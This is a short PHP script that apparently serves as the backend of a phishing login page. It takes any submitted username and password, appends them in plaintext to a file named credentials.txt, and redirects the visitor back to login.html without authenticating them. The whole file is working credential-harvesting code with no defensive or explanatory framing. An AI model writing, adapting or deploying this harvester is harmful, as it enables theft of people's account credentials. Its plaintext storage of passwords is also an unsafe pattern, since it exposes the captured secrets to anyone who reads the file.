<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Get the username and password from the form
    $username = $_POST["username"];
    $password = $_POST["password"];

    // Open the text file in append mode
    $file = fopen("credentials.txt", "a");

    // Write the username and password to the text file
    fwrite($file, "Username: " . $username . "\nPassword: " . $password . "\n\n");

    // Close the file
    fclose($file);

    // Redirect the user back to the login page
    header("Location: login.html");
    exit();
} else {
    echo "Invalid request method.";
}
?>
